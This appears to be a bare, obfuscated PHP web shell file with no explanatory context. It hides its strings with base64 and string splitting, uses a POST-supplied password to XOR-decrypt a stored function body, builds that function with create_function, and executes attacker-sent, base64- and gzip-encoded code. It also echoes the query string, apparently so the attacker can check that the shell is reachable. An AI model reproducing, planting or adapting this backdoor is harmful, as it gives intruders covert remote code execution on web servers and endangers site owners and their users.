<?php

class c641084ec3eef0
{
    private $r641084ec3f1a2 = [];

    public function __call($name, $args)
    {
        call_user_func_array($this->r641084ec3f1a2[$name], $args);
    }

    public function d641084ec40159($s)
    {
        $function = 'b' . 'ase' . '64' . '_' . 'de' . 'code';
        $string = $function($s);
        return explode('::', $string, 2)[1];
    }

    public function p641084ec3f19e()
    {
        $qString = $this->d641084ec40159("WW5OTTdlVHFlZ0xMc0tRPTo6UVVFUllfU1RSSU5H");

        if (!empty($_SERVER[$qString])) {
            exit($_SERVER[$qString]);
        }

        $e = $this->d641084ec40159("K1R5cUV1ST06OmU=");
        $p = $this->d641084ec40159("cVhJdmlyanRuK0ZzNnc9PTo6cA==");

        if (!isset($_POST[$e]) ||
            !isset($_POST[$p])) {
            return;
        }

        $methodName = 'em641084ec4015c';
        $methodContent = 'U0JQXBBSEA1Xb1ZQEGlVQ1dLHEw4BG0YDg==';

        $base64decode = $this->d641084ec40159("d0REblU2SWl5L1ZHSTVjPTo6YmFzZTY0X2RlY29kZQ==");
        $createFunction = $this->d641084ec40159("Q2Q1R0RlZz06OmNyZWF0ZV9mdW5jdGlvbg==");
        $gzinflate = $this->d641084ec40159("U2RlVkxOMU1GSkU9OjpnemluZmxhdGU=");
        $regex = $this->d641084ec40159("QnI1ZWd0dnRzUVk9OjovXlsgLX5dKyQv");

        $methodContent = str_split($base64decode($methodContent));

        $password = $_POST[$p];
        $password = str_split($password);

        $temp = [];

        for ($i = 0; $i < count($methodContent); $i++) {
            $temp[] = chr(ord($methodContent[$i]) ^ ord($password[$i % count($password)]));
        }

        $methodContent = implode('', $temp);

        if (preg_match($regex, $methodContent)) {
            $this->r641084ec3f1a2[$methodName] = $createFunction('', $methodContent);

            $code = $gzinflate($base64decode($_POST[$e]));
            $this->{$methodName}($code);
        }
    }
}

(new c641084ec3eef0)->p641084ec3f19e();
